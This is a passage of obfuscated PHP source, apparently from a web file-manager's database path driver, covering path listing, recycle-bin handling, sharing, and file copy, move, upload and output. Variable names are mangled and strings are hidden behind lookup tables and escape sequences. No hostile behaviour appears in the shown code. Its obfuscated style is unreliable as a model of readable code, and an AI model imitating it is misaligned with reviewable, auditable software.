$this->field($á—Ğôğ–[528])->where($¡Ÿü¢‡)->select(); } if (!$±ßˆ¤××) { $±ßˆ¤×× = array(); } foreach ($±ßˆ¤×× as $úÈ³Ëö) { $ûº“Õáù[$úÈ³Ëö[$á—Ğôğ–[403]]] = $úÈ³Ëö[$á—Ğôğ–[42]]; } } $àÆä‚ş¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $×™â¦» = array(); foreach ($ë¤‡‘¿ as &$­­ïÏâí) { $ıáó›îˆ = $­­ïÏâí[$á—Ğôğ–[521]]; $êÎãã®ï = $á—Ğôğ–[22]; if (isset($×™â¦»[$ıáó›îˆ])) { $êÎãã®ï = $×™â¦»[$ıáó›îˆ]; } else { $‰²ùùˆ† = $this->parentLevelArray($­­ïÏâí[$á—Ğôğ–[521]]); foreach ($‰²ùùˆ† as $ıÁÁ³¤“ => $ƒÆò­Ñ’) { if (isset($ûº“Õáù[$ƒÆò­Ñ’])) { $êÎãã®ï .= $ûº“Õáù[$ƒÆò­Ñ’] . $á—Ğôğ–[18]; } } $×™â¦»[$ıáó›îˆ] = $êÎãã®ï; } $êÎãã®ï .= $­­ïÏâí[$á—Ğôğ–[42]]; if ($­­ïÏâí[$á—Ğôğ–[411]] == $á—Ğôğ–[99]) { $êÎãã®ï .= $á—Ğôğ–[18]; } $­­ïÏâí[$á—Ğôğ–[519]] = str_replace($á—Ğôğ–[529], $á—Ğôğ–[18], $êÎãã®ï); if ($­­ïÏâí[$á—Ğôğ–[498]] == $á—Ğôğ–[200]) { $­­ïÏâí[$á—Ğôğ–[42]] = trim($ûº“Õáù[$­­ïÏâí[$á—Ğôğ–[403]]], $á—Ğôğ–[18]); $­­ïÏâí[$á—Ğôğ–[519]] = $­­ïÏâí[$á—Ğôğ–[42]] . $á—Ğôğ–[18]; } if (intval($­­ïÏâí[$á—Ğôğ–[412]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($­­ïÏâí, $‰²ùùˆ†, $àÆä‚ş¡); } } unset($­­ïÏâí); return $ë¤‡‘¿; } private function _listAppendPathRecycle(&$·İ“õŒú, $Æù¼¥©é, $€æÕœÊÓ) { $Üà£¼…¾ =& $_SERVER[¹àö™Ç¾]; if (!in_array($€æÕœÊÓ, $Æù¼¥©é) && $·İ“õŒú[$Üà£¼…¾[403]] != $€æÕœÊÓ) { return; } $ÜàºïĞ¯ = explode($Üà£¼…¾[18], trim($·İ“õŒú[$Üà£¼…¾[519]], $Üà£¼…¾[18])); $›”˜×» = implode($Üà£¼…¾[18], array_slice($ÜàºïĞ¯, 2)); $·İ“õŒú[$Üà£¼…¾[519]] = $Üà£¼…¾[18] . LNG($Üà£¼…¾[530]) . $Üà£¼…¾[18] . ltrim($›”˜×», $Üà£¼…¾[18]); $·İ“õŒú[$Üà£¼…¾[521]] = $Üà£¼…¾[531] . implode($Üà£¼…¾[60], array_slice($Æù¼¥©é, 1)) . $Üà£¼…¾[60]; if ($·İ“õŒú[$Üà£¼…¾[403]] == $€æÕœÊÓ) { $·İ“õŒú[$Üà£¼…¾[521]] = $Üà£¼…¾[531]; $·İ“õŒú[$Üà£¼…¾[498]] = $Üà£¼…¾[200]; $·İ“õŒú[$Üà£¼…¾[42]] = LNG($Üà£¼…¾[530]); } $·İ“õŒú[$Üà£¼…¾[532]] = $Üà£¼…¾[533]; } protected function _listAppendPathRoot(&$Øş’Ş§§, $¾ƒ™ìÈ) { $Ä³†ŞËê =& $_SERVER[¹àö™Ç¾]; $êÓîî¥ = $Ä³†ŞËê[22]; if ($Øş’Ş§§[$Ä³†ŞËê[412]] == self::TYPE_USER) { if (defined($Ä³†ŞËê[474]) && $Øş’Ş§§[$Ä³†ŞËê[504]] == USER_ID) { $êÓîî¥ = LNG($Ä³†ŞËê[534]); if (!$¾ƒ™ìÈ) { $Øş’Ş§§[$Ä³†ŞËê[42]] = $êÓîî¥; } } else { $ ¨Ÿ÷® = Model($Ä³†ŞËê[513])->getInfoSimple($Øş’Ş§§[$Ä³†ŞËê[504]]); $êÓîî¥ = LNG($Ä³†ŞËê[535]) . $Ä³†ŞËê[169] . $ ¨Ÿ÷®[$Ä³†ŞËê[42]] . $Ä³†ŞËê[536]; } } else { if ($Øş’Ş§§[$Ä³†ŞËê[412]] == self::TYPE_GROUP) { $ ¨Ÿ÷® = Model($Ä³†ŞËê[522])->getInfoSimple($Øş’Ş§§[$Ä³†ŞËê[504]]); $êÓîî¥ = $ ¨Ÿ÷®[$Ä³†ŞËê[42]]; } else { if ($Øş’Ş§§[$Ä³†ŞËê[412]] == self::TYPE_SYSTEM) { $êÓîî¥ = $Ä³†ŞËê[537]; } } } $êÓîî¥ = $êÓîî¥ ? $Ä³†ŞËê[18] . $êÓîî¥ . $Ä³†ŞËê[18] : $Ä³†ŞËê[18]; return $êÓîî¥; } protected function _listAppendUser(&$‡××Øö) { $üµ’ºœ =& $_SERVER[¹àö™Ç¾]; $àåÌê”ù = array_to_keyvalue($‡××Øö, $üµ’ºœ[22], $üµ’ºœ[452]); $»Ä—¡Œ = array_to_keyvalue($‡××Øö, $üµ’ºœ[22], $üµ’ºœ[454]); $”ß…­Ó = array_merge($àåÌê”ù, $»Ä—¡Œ); $˜ŞÊ¸› = Model($üµ’ºœ[538])->userListInfo($”ß…­Ó); foreach ($‡××Øö as &$À”ã‡ß) { $÷Ã…ûÅ» = $À”ã‡ß[$üµ’ºœ[452]]; $À”ã‡ß[$üµ’ºœ[452]] = $˜ŞÊ¸›[$÷Ã…ûÅ»] ? $˜ŞÊ¸›[$÷Ã…ûÅ»] : !1; $÷Ã…ûÅ» = $À”ã‡ß[$üµ’ºœ[454]]; $À”ã‡ß[$üµ’ºœ[454]] = $˜ŞÊ¸›[$÷Ã…ûÅ»] ? $˜ŞÊ¸›[$÷Ã…ûÅ»] : !1; if (isset($À”ã‡ß[$üµ’ºœ[465]]) && $À”ã‡ß[$üµ’ºœ[465]][$üµ’ºœ[539]]) { $ˆ´ä—çæ = $GLOBALS[$üµ’ºœ[16]][$üµ’ºœ[100]][$üµ’ºœ[540]]; if ($À”ã‡ß[$üµ’ºœ[465]][$üµ’ºœ[541]] <= time() - $ˆ´ä—çæ) { $this->metaSet($À”ã‡ß[$üµ’ºœ[403]], $üµ’ºœ[539], null); $this->metaSet($À”ã‡ß[$üµ’ºœ[403]], $üµ’ºœ[541], null); unset($À”ã‡ß[$üµ’ºœ[465]][$üµ’ºœ[539]]); continue; } $çìº¦–‚ = $À”ã‡ß[$üµ’ºœ[465]][$üµ’ºœ[539]]; $À”ã‡ß[$üµ’ºœ[465]][$üµ’ºœ[542]] = Model($üµ’ºœ[538])->getInfoSimpleOuter($çìº¦–‚); } } unset($À”ã‡ß); } public function parentLevelArray($Ôó¦õ£) { $¤Ó³ô™¨ =& $_SERVER[¹àö™Ç¾]; $Ôó¦õ£ = explode($¤Ó³ô™¨[60], trim($Ôó¦õ£, $¤Ó³ô™¨[60])); return array_remove_value($Ôó¦õ£, $¤Ó³ô™¨[200]); } public function listAll($Ë¦şãå¡) { $ÑıÓµ÷É =& $_SERVER[¹àö™Ç¾]; $•¸®Ä¬É = $this->sourceInfo($Ë¦şãå¡); $¤ûíı– = array($ÑıÓµ÷É[543] => array($ÑıÓµ÷É[544], $•¸®Ä¬É[$ÑıÓµ÷É[521]] . $Ë¦şãå¡ . $ÑıÓµ÷É[545]), $ÑıÓµ÷É[546] => 0); $˜Ù°©Ú = $ÑıÓµ÷É[547]; $×’¸¨ßÕ = "\114\x45\x46\x54\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\146\151\x6c\x65\x20\146\151\x6c\145\40\x6f\156\40\163\x6f\x75\x72\x63\145\x2e\146\151\x6c\145\111\104\x20\75\x20\146\x69\x6c\145\56\146\x69\154\x65\111\x44"; $³ÆßÉÚ = $this->alias($ÑıÓµ÷É[444])->field($˜Ù°©Ú)->where($¤ûíı–)->join($×’¸¨ßÕ)->select(); $this->_listAppendAuth($³ÆßÉÚ); $this->_listAppendUser($³ÆßÉÚ); $this->_listAppendPath($³ÆßÉÚ); $³ÆßÉÚ = array_to_keyvalue($³ÆßÉÚ, $ÑıÓµ÷É[403]); $» Ø¼Ôû = "\x2f{$•¸®Ä¬É[$ÑıÓµ÷É[42]]}\57"; $» Ø¼Ôû = $» Ø¼Ôû == $ÑıÓµ÷É[529] ? $ÑıÓµ÷É[18] : $» Ø¼Ôû; $áÚ¶ÎšØ = array(); foreach ($³ÆßÉÚ as $Ü‡ğéù° => $¯ÚÃà…Â) { $ï‚ÉÒŸá = $this->parentLevelArray($¯ÚÃà…Â[$ÑıÓµ÷É[521]]); array_shift($ï‚ÉÒŸá); $£õÎäşß = $» Ø¼Ôû; for ($Ü¥Ì©àä = 0; $Ü¥Ì©àä < count($ï‚ÉÒŸá); $Ü¥Ì©àä++) { $£õÎäşß .= $³ÆßÉÚ[$ï‚ÉÒŸá[$Ü¥Ì©àä]][$ÑıÓµ÷É[42]] . $ÑıÓµ÷É[18]; } $£õÎäşß .= $¯ÚÃà…Â[$ÑıÓµ÷É[42]]; if ($¯ÚÃà…Â[$ÑıÓµ÷É[411]]) { $£õÎäşß .= $ÑıÓµ÷É[18]; } $£õÎäşß = str_replace($ÑıÓµ÷É[529], $ÑıÓµ÷É[18], $£õÎäşß); $£õÎäşß = str_replace($ÑıÓµ÷É[529], $ÑıÓµ÷É[18], $£õÎäşß); $ä»óåí’ = array($ÑıÓµ÷É[422] => str_replace($ÑıÓµ÷É[529], $ÑıÓµ÷É[18], $£õÎäşß), $ÑıÓµ÷É[548] => intval($¯ÚÃà…Â[$ÑıÓµ÷É[411]]), $ÑıÓµ÷É[97] => $this->pathInfoFilter($¯ÚÃà…Â)); if (!$¯ÚÃà…Â[$ÑıÓµ÷É[411]]) { $ä»óåí’[$ÑıÓµ÷É[467]] = $¯ÚÃà…Â[$ÑıÓµ÷É[467]]; $ä»óåí’[$ÑıÓµ÷É[98]] = $¯ÚÃà…Â[$ÑıÓµ÷É[88]]; } $áÚ¶ÎšØ[] = $ä»óåí’; } return $áÚ¶ÎšØ; } } goto a‡‚Í÷İ¾; Cê—ŒÚá¶: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($öü—ÃƒÉ) { $this->pathParse = $öü—ÃƒÉ; $this->model = Model($_SERVER[¹àö™Ç¾][1310]); } public function getPath($ ş¹Ûñ) { return trim($ ş¹Ûñ, $_SERVER[¹àö™Ç¾][18]); } public function pathFather($Óğ¾ÁÄŞ) { $“í·¦óµ = $this->parse($Óğ¾ÁÄŞ); $“í·¦óµ = $this->infoSimple($Óğ¾ÁÄŞ); return $“í·¦óµ ? $“í·¦óµ[$_SERVER[¹àö™Ç¾][498]] : !1; } public function pathThis($³ÎŞÓê¿) { $òÂ­‘øº = $this->infoSimple($³ÎŞÓê¿); return $òÂ­‘øº ? $òÂ­‘øº[$_SERVER[¹àö™Ç¾][42]] : !1; } public function getPathOuter($Á³¬âÛó) { if (!$Á³¬âÛó) { return $Á³¬âÛó; } $æÕÛúÀ£ = $this->parse($Á³¬âÛó); return KodIO::make($æÕÛúÀ£[$_SERVER[¹àö™Ç¾][401]]); } public function copyFolderFromIO($êŒ×Ùˆ½, $©£©¶ùè, $Åºö¬², $»ÄïÙä·, $¸¦ÄâÛì) { $½éˆÕë» = $this->model->copyFolderFromIO($êŒ×Ùˆ½, $©£©¶ùè, $Åºö¬², $»ÄïÙä·, $¸¦ÄâÛì); return KodIO::make($½éˆÕë»); } public function isParentOf($Â¡»‰à±, $˜¿¨÷ôÊ) { return $this->model->isParentOf($Â¡»‰à±, $˜¿¨÷ôÊ); } public function mkfile($­¡¼Ú³€, $ï’óûö = '', $÷›êÍ·ù = REPEAT_RENAME) { $º€ìí¸ø =& $_SERVER[¹àö™Ç¾]; $‘Ù‰Ş©Ã = $this->parse($­¡¼Ú³€); $­¡¼Ú³€ = $‘Ù‰Ş©Ã[$º€ìí¸ø[401]]; for ($”Æ®«‰ = 0; $”Æ®«‰ < count($‘Ù‰Ş©Ã[$º€ìí¸ø[1311]]); $”Æ®«‰++) { $¼Ë‰ÑÏı = $‘Ù‰Ş©Ã[$º€ìí¸ø[1311]][$”Æ®«‰]; if ($”Æ®«‰ == count($‘Ù‰Ş©Ã[$º€ìí¸ø[1311]]) - 1) { $­¡¼Ú³€ = $this->model->mkfile($­¡¼Ú³€, $¼Ë‰ÑÏı, $ï’óûö, $÷›êÍ·ù); break; } $­¡¼Ú³€ = $this->model->mkdir($­¡¼Ú³€, $¼Ë‰ÑÏı, REPEAT_SKIP); } return $this->getPathOuter($­¡¼Ú³€); } public function mkdir($¼ÈÂ³·Ù, $î­ñ§äğ = REPEAT_SKIP) { $“¹ì íˆ =& $_SERVER[¹àö™Ç¾]; $–Í¨ó = $this->parse($¼ÈÂ³·Ù); $¼ÈÂ³·Ù = $–Í¨ó[$“¹ì íˆ[401]]; for ($©¦Šû«¸ = 0; $©¦Šû«¸ < count($–Í¨ó[$“¹ì íˆ[1311]]); $©¦Šû«¸++) { $•Âó¡ËÂ = $–Í¨ó[$“¹ì íˆ[1311]][$©¦Šû«¸]; $¼ÈÂ³·Ù = $this->model->mkdir($¼ÈÂ³·Ù, $•Âó¡ËÂ, $î­ñ§äğ); } return $this->getPathOuter($¼ÈÂ³·Ù); } public function copyFile($Ö¢Û²¾é, $şÍ¸Í‹õ, $ö„ú¯ŠØ = REPEAT_REPLACE) { $¿Á¼ƒ‹é =& $_SERVER[¹àö™Ç¾]; $±İ´Óıá = $this->parse($şÍ¸Í‹õ); $‹Ë¼àõ = $this->model->copy($Ö¢Û²¾é, $±İ´Óıá[$¿Á¼ƒ‹é[401]], $ö„ú¯ŠØ, $±İ´Óıá[$¿Á¼ƒ‹é[88]]); return $‹Ë¼àõ ? $this->getPathOuter($‹Ë¼àõ) : !1; } public function moveFile($šùïÉ , $ÌÔîÍ…®, $İÆş©‚é = REPEAT_REPLACE) { $£Î¯Œ¶ =& $_SERVER[¹àö™Ç¾]; $ó§Æ¡˜ = $this->parse($ÌÔîÍ…®); $İ€ùÕû = $this->model->move($šùïÉ , $ó§Æ¡˜[$£Î¯Œ¶[401]], $İÆş©‚é, $ó§Æ¡˜[$£Î¯Œ¶[88]]); return $İ€ùÕû ? $this->getPathOuter($İ€ùÕû) : !1; } public function copy($éÛ§Åı, $Æ®ÙÒõ’, $é‚ƒØÇ = REPEAT_REPLACE, $è¿ñÇü = false) { $†ş¾è© = $this->parse($Æ®ÙÒõ’); $æ¸ÑÛ  = $this->model->copy($éÛ§Åı, $†ş¾è©[$_SERVER[¹àö™Ç¾][401]], $é‚ƒØÇ, $è¿ñÇü); return $æ¸ÑÛ  ? $this->getPathOuter($æ¸ÑÛ ) : !1; } public function moveSameAllow() { } public function move($¾ÅÂÍ»ã, $éõùòÕ¦, $â¬ü¶¡à = REPEAT_REPLACE, $œóÌØ¦ = false) { $Øşû€» = $this->parse($éõùòÕ¦); $Åõ„ê™ö = $this->model->move($¾ÅÂÍ»ã, $Øşû€»[$_SERVER[¹àö™Ç¾][401]], $â¬ü¶¡à, $œóÌØ¦); return $Åõ„ê™ö ? $this->getPathOuter($Åõ„ê™ö) : !1; } public function remove($•——ì•ş, $ôÏÚµØì = true) { return $this->model->remove($•——ì•ş, $ôÏÚµØì); } public function rename($ÕæÕñ§, $É¯é¿É…) { $ÓÚè…ï = $this->model->rename($ÕæÕñ§, $É¯é¿É…); return $ÓÚè…ï ? $this->getPathOuter($ÕæÕñ§) : $ÓÚè…ï; } public function size($­ƒÙ„„) { $ Êµ„Ç = $this->infoSimple($­ƒÙ„„); return $ Êµ„Ç ? $ Êµ„Ç[$_SERVER[¹àö™Ç¾][90]] : 0; } public function infoSimple($ü©ñáØ¥) { return $this->model->sourceInfo($ü©ñáØ¥); } public function info($«ĞŒ¯È¶) { return $this->infoParse($«ĞŒ¯È¶); } public function infoAuth($¾û¯ëÉ) { return $this->infoParse($¾û¯ëÉ, !1, !0); } public function infoWithChildren($äñÅŞ¹ª) { return $this->infoParse($äñÅŞ¹ª, !0); } protected function infoParse($ü™Ñ´àˆ, $ğúÖôÕ¸ = false, $åœë¢õñ = false) { if (!$ğúÖôÕ¸) { return $this->model->pathInfo($ü™Ñ´àˆ, $åœë¢õñ); } return $this->model->pathInfoMore($ü™Ñ´àˆ); } public function infoFull($º¦çÏ°ã) { $ıİË¦êó =& $_SERVER[¹àö™Ç¾]; $çó×§†† = explode($ıİË¦êó[18], $º¦çÏ°ã); $ÊÔ¾ïÒŒ = implode($ıİË¦êó[18], array_splice($çó×§††, 1)); return $this->model->pathInfoByPath($çó×§††[0], $ÊÔ¾ïÒŒ); } public function hashSimple($´åÕ½üõ) { $ĞèıÂËš =& $_SERVER[¹àö™Ç¾]; $ó‹¾¸³Ì = $this->infoWithChildren($´åÕ½üõ); return $ó‹¾¸³Ì[$ĞèıÂËš[173]][$ĞèıÂËš[180]]; } public function hashMd5($âÇÃìÛ‚) { $Ãƒı¦Îî =& $_SERVER[¹àö™Ç¾]; $„ñûÚ¹š = $this->infoWithChildren($âÇÃìÛ‚); return $„ñûÚ¹š[$Ãƒı¦Îî[173]][$Ãƒı¦Îî[179]]; } public function exist($¾–ÁıÃ®) { $•Ò„ëˆ» =& $_SERVER[¹àö™Ç¾]; $Ÿ…¢°‚ì = $this->parse($¾–ÁıÃ®); if (!$Ÿ…¢°‚ì[$•Ò„ëˆ»[88]]) { return $this->isFile($¾–ÁıÃ®) || $this->isFolder($¾–ÁıÃ®); } $”Ÿñ”¹¥ = array($•Ò„ëˆ»[402] => $Ÿ…¢°‚ì[$•Ò„ëˆ»[401]], $•Ò„ëˆ»[42] => $Ÿ…¢°‚ì[$•Ò„ëˆ»[88]]); $ÉáœÑ–° = $this->model->where($”Ÿñ”¹¥)->find(); return $ÉáœÑ–° ? !0 : !1; } public function isFile($óˆ–ğ€µ) { $Î¹¹¾ß¥ =& $_SERVER[¹àö™Ç¾]; $ã™Ş¡© = $this->infoSimple($óˆ–ğ€µ); return $ã™Ş¡© && $ã™Ş¡©[$Î¹¹¾ß¥[411]] == $Î¹¹¾ß¥[99] ? !1 : !0; } public function isFolder($æĞ›”×ù) { $š÷Ë¾³ =& $_SERVER[¹àö™Ç¾]; $•õşÇË¼ = $this->infoSimple($æĞ›”×ù); return $•õşÇË¼ && $•õşÇË¼[$š÷Ë¾³[411]] == $š÷Ë¾³[99] ? !0 : !1; } public function listPath($ü‰ËøÜ‹, $—…Ô²€Ì = false) { $Ü’ÄàÜ =& $_SERVER[¹àö™Ç¾]; if ($ü‰ËøÜ‹ == $Ü’ÄàÜ[22]) { return !1; } $šò¾·’ = array($Ü’ÄàÜ[402] => $ü‰ËøÜ‹); if ($—…Ô²€Ì) { return $this->model->listSource($šò¾·’, -1); } return $this->model->listSource($šò¾·’); } public function has($ÔĞÁÇ¬Š, $ñ‰¿ÁÜŠ = false, $Ï¤‘¾ı¼ = null) { $àÚãšÛŸ =& $_SERVER[¹àö™Ç¾]; $ª×—ßç÷ = $this->infoWithChildren($ÔĞÁÇ¬Š); if ($ñ‰¿ÁÜŠ) { return array($àÚãšÛŸ[213] => $ª×—ßç÷[$àÚãšÛŸ[213]], $àÚãšÛŸ[212] => $ª×—ßç÷[$àÚãšÛŸ[212]]); } return $Ï¤‘¾ı¼ ? $ª×—ßç÷[$àÚãšÛŸ[213]] : $ª×—ßç÷[$àÚãšÛŸ[212]]; } public function listAll($ËäéÊ§ñ) { $û­¸»âŸ = IO::info($this->pathParse[$_SERVER[¹àö™Ç¾][88]]); if (!$û­¸»âŸ) { return array(); } return $this->model->listAll($ËäéÊ§ñ); } public function getContent($¸¾îó¨) { return $this->model->getContent($¸¾îó¨); } public function setContent($É¬……Š, $¨ó¶üåš = '') { return $this->model->setContent($É¬……Š, $¨ó¶üåš); } public function fileSubstr($Ó‹¶ïô‡, $–Æ²æ Ç, $û•ğ™û) { return $this->model->fileSubstr($Ó‹¶ïô‡, $–Æ²æ Ç, $û•ğ™û); } public function download($©äüœ°¼, $Šà„–ÒÛ = '') { $Ì®¿§™Ó = get_path_father($Šà„–ÒÛ); $‡ËúÌÍì = get_path_this($Šà„–ÒÛ); $ï¸•ÆŒª = $this->model->fileInfoGet($©äüœ°¼); $•¥«Î« = IO::copy($ï¸•ÆŒª[$_SERVER[¹àö™Ç¾][88]], $Ì®¿§™Ó, !1, $‡ËúÌÍì); return $•¥«Î«; } public function setModifyTime($¥Øæªş, $‘¯¸®”Ä = '') { $¶ıˆêÏÓ =& $_SERVER[¹àö™Ç¾]; if (!$¥Øæªş) { return; } $this->model->where(array($¶ıˆêÏÓ[418] => $¥Øæªş))->save(array($¶ıˆêÏÓ[96] => $‘¯¸®”Ä)); } public function upload($–«ôƒÑ, $Ã‰¸ª¥´, $Ú‡ø”£ô = false, $Ã…ÀÔê• = REPEAT_REPLACE) { $ÈÖÓ»ÌÔ =& $_SERVER[¹àö™Ç¾]; $ï™—«â = $this->parse($–«ôƒÑ); $ù·ËÇ“º = $this->model->addFile($ï™—«â[$ÈÖÓ»ÌÔ[401]], $Ã‰¸ª¥´, $ï™—«â[$ÈÖÓ»ÌÔ[88]], $Ú‡ø”£ô, $Ã…ÀÔê•); return $this->getPathOuter($ù·ËÇ“º); } public function uploadFileByID($¯Ø€çîì, $ƒ€ŞÁ, $£Ñâ†¥µ) { $úÒ££èğ =& $_SERVER[¹àö™Ç¾]; $ãŸÉª“² = $this->parse($¯Ø€çîì); $ŞÄ·º¿À = $this->model->addFileByFileID($ãŸÉª“²[$úÒ££èğ[401]], $ƒ€ŞÁ, $ãŸÉª“²[$úÒ££èğ[88]], $£Ñâ†¥µ); return $this->getPathOuter($ŞÄ·º¿À); } public function addFileByRemote($£Ì€êèİ, $ÊºÀŒÂõ, $­Å÷Ê»¼ = array(), $ğì¿¿ûĞ = '', $’°Ò®Õ„) { $×ÒÒşš‘ =& $_SERVER[¹àö™Ç¾]; $¯ú­û²ï = $this->parse($£Ì€êèİ); $ğì¿¿ûĞ = empty($ğì¿¿ûĞ) ? $¯ú­û²ï[$×ÒÒşš‘[88]] : $ğì¿¿ûĞ; $ìĞ©€È = $this->model->addFileByRemote($¯ú­û²ï[$×ÒÒşš‘[401]], $ÊºÀŒÂõ, $ğì¿¿ûĞ, $­Å÷Ê»¼, $’°Ò®Õ„); return $this->getPathOuter($ìĞ©€È); } public function uploadLink($ÔÌ­•«µ, $ÑØ¿óªâ = 0) { $©œõîâˆ =& $_SERVER[¹àö™Ç¾]; $¼ˆÅªÍû = $this->parse($ÔÌ­•«µ); $é‰Ëø˜© = _get($GLOBALS[$©œõîâˆ[17]], $©œõîâˆ[1312]); $ÁçªšÎÌ = _get($GLOBALS[$©œõîâˆ[17]], $©œõîâˆ[1313]); $ÔÌ­•«µ = Model($©œõîâˆ[603])->createFileName($¼ˆÅªÍû[$©œõîâˆ[88]], $é‰Ëø˜©, $ÁçªšÎÌ); return IO::uploadLink($ÔÌ­•«µ, $ÑØ¿óªâ); } public function fileNameAuto($Ú¼ÅŸÇÌ, $ËÔ×ŞçÌ, $ÎÈî‘Ø = REPEAT_REPLACE, $ô”Ë‰±÷ = false) { return $this->model->fileNameAuto($Ú¼ÅŸÇÌ, $ËÔ×ŞçÌ, $ÎÈî‘Ø, $ô”Ë‰±÷); } public function fileNameExist($ÔØªÇÑ“, $«Î‘âø) { return $this->model->fileNameExist($ÔØªÇÑ“, $«Î‘âø); } protected function _fileOut($ªº¹¹ÑÚ, $§ª„¸•¥ = false, $æñÔ‹‡Ì = false, $º×ï·§ = '', $šÀ§Êã = false) { $¤æôôÓ =& $_SERVER[¹àö™Ç¾]; $†Êƒéğ = $this->model->sourceInfo($ªº¹¹ÑÚ); if ($†Êƒéğ[$¤æôôÓ[411]] == $¤æôôÓ[99]) { header($¤æôôÓ[1314]); die; } $³ªÚè˜Ã = $this->model->fileInfoGet($ªº¹¹ÑÚ); $º×ï·§ = $³ªÚè˜Ã[$¤æôôÓ[179]] ? $³ªÚè˜Ã[$¤æôôÓ[179]] : $º×ï·§; $ëú‡Œ†Ó = isset($GLOBALS[$¤æôôÓ[1315]]) ? $GLOBALS[$¤æôôÓ[1315]] : $†Êƒéğ[$¤æôôÓ[42]]; if ($šÀ§Êã) { return IO::fileOutServer($³ªÚè˜Ã[$¤æôôÓ[88]], $§ª„¸•¥, $ëú‡Œ†Ó, $º×ï·§); } IO::fileOut($³ªÚè˜Ã[$¤æôôÓ[88]], $§ª„¸•¥, $ëú‡Œ†Ó, $º×ï·§); } public function fileOut($¾Óèîì½, $¡­ÒéÄº = false, $¶Ã¤Çû = false, $šë›÷Õ = '') { $this->_fileOut($¾Óèîì½, $¡­ÒéÄº, $¶Ã¤Çû, $šë›÷Õ); } public function fileOutServer($¨üğõÂÑ, $àğòÑ£´ = false, $î×¬ÔÃ• = false, $Œª¼¤¤œ = '') { $this->_fileOut($¨üğõÂÑ, $àğòÑ£´, $î×¬ÔÃ•, $Œª¼¤¤œ, !0); } protected function _fileOutImage($¥³­Œßê, $î¹Ü¾Î­ = 250) { $şºˆ¢ç÷ =& $_SERVER[¹àö™Ç¾]; $’´øü›– = $this->model->pathInfo($¥³­Œßê); if ($’´øü›–[$şºˆ¢ç÷[411]] == $şºˆ¢ç÷[99]) { show_json($şºˆ¢ç÷[1316] . $¥³­Œßê, !1); } $µ…€åàº = $this->model->fileInfoGet($¥³­Œßê); $µ…€åàº[$şºˆ¢ç÷[42]] = $’´øü›–[$şºˆ¢ç÷[42]]; $µ…€åàº[$şºˆ¢ç÷[172]] = $’´øü›–[$şºˆ¢ç÷[172]]; $GLOBALS[$şºˆ¢ç÷[1315]] = $µ…€åàº[$şºˆ¢ç÷[42]]; $GLOBALS[$şºˆ¢ç÷[171]] = $µ…€åàº; IO::fileOutImage($µ…€åàº[$şºˆ¢ç÷[88]], $î¹Ü¾Î­); } public function fileOutImage($Ñ²ÀÀ‘, $’€ì£± = 250) { $this->_fileOutImage($Ñ²ÀÀ‘, $’€ì£±); } public function fileOutImageServer($¨‚•Ã°ä, $×Š¨Ç”— = 250) { $this->_fileOutImage($¨‚•Ã°ä, $×Š¨Ç”—); } public function link($Ë‰ıŒø, $äµş—æí = '') { $—Ú“ã¤ = $this->model->fileInfoGet($Ë‰ıŒø); return IO::link($—Ú“ã¤[$_SERVER[¹àö™Ç¾][88]], $äµş—æí); } protected function parse($ßÊÊÆğˆ) { $²°ñîÛô =& $_SERVER[¹àö™Ç¾]; if (strstr($ßÊÊÆğˆ, $²°ñîÛô[18]) === !1) { return array($²°ñîÛô[420] => intval($ßÊÊÆğˆ), $²°ñîÛô[88] => $²°ñîÛô[22], $²°ñîÛô[1311] => array()); } $ßéíƒšÏ = explode($²°ñîÛô[18], trim($ßÊÊÆğˆ, $²°ñîÛô[18])); if (count($ßéíƒšÏ) < 2) { show_tips(clear_html($ßÊÊÆğˆ) . $²°ñîÛô[1317]); } return array($²°ñîÛô[420] => intval($ßéíƒšÏ[0]), $²°ñîÛô[88] => $ßéíƒšÏ[1], $²°ñîÛô[1311] => array_slice($ßéíƒšÏ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ñºØ‘®) { $this->pathParse = $ñºØ‘®; $this->model = Model($_SERVER[¹àö™Ç¾][1310]); } public function getPathOuter($µ’ñë§») { $Åë“ë˜³ =& $_SERVER[¹àö™Ç¾]; if (!$µ’ñë§») { return $µ’ñë§»; } $¨’Î²–ä = $this->parse($µ’ñë§»); return trim(KodIO::makeShare($this->pathParse[$Åë“ë˜³[401]], $¨’Î²–ä[$Åë“ë˜³[401]]), $Åë“ë˜³[18]); } protected function infoParse($µ×œŒÖ, $—Åıß¶â = false, $‘ùêß¤£ = false) { $äõÃçäá =& $_SERVER[¹àö™Ç¾]; $ŒĞ•ñÖè = $this->pathParse[$äõÃçäá[401]]; $Äî›ùÂ› = trim($this->pathParse[$äõÃçäá[1152]], $äõÃçäá[18]); return Action($äõÃçäá[1318])->sharePathInfo($ŒĞ•ñÖè, $Äî›ùÂ›, $—Åıß¶â); } public function infoFull($ü…Ã“¦­) { $‚ëÃˆöÂ =& $_SERVER[¹àö™Ç¾]; $Ã¬£”Éç = explode($‚ëÃˆöÂ[18], trim($ü…Ã“¦­, $‚ëÃˆöÂ[18])); if (count($Ã¬£”Éç) > 1) { $Éº¤ÅË = implode($‚ëÃˆöÂ[18], array_splice($Ã¬£”Éç, 1)); $øÂ»Òşö = $this->model->pathInfoByPath($Ã¬£”Éç[0], $Éº¤ÅË); if (!$øÂ»Òşö) { return !1; } $this->pathParse[$‚ëÃˆöÂ[1152]] = $øÂ»Òşö[$‚ëÃˆöÂ[403]]; } return $this->infoParse($ü…Ã“¦­); } public function listAll($¢··÷ë) { $³òƒ«Ö… =& $_SERVER[¹àö™Ç¾]; $£É’š” = IO::info($this->pathParse[$³òƒ«Ö…[88]]); if (!$£É’š”) { return array(); } $ï‘Ñ¬ı = $this->model->listAll($¢··÷ë); $Êİ”šî = Model($³òƒ«Ö…[595])->getInfo($£É’š”[$³òƒ«Ö…[488]]); $£Ï—“©› = Action($³òƒ«Ö…[1318]); foreach ($ï‘Ñ¬ı as &$·Ó³æ½Õ) { check_abort(); $·Ó³æ½Õ[$³òƒ«Ö…[97]] = $£Ï—“©›->_shareItemeParse($·Ó³æ½Õ[$³òƒ«Ö…[97]], $Êİ”šî); } unset($·Ó³æ½Õ); return $ï‘Ñ¬ı; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($³ïƒş›“) { $this->pathParse = $³ïƒş›“; $this->model = Model($_SERVER[¹àö™Ç¾][1310]); } protected function infoParse($àşùõâ—, $¸†áš® = false, $âºÎéµ£ = false) { 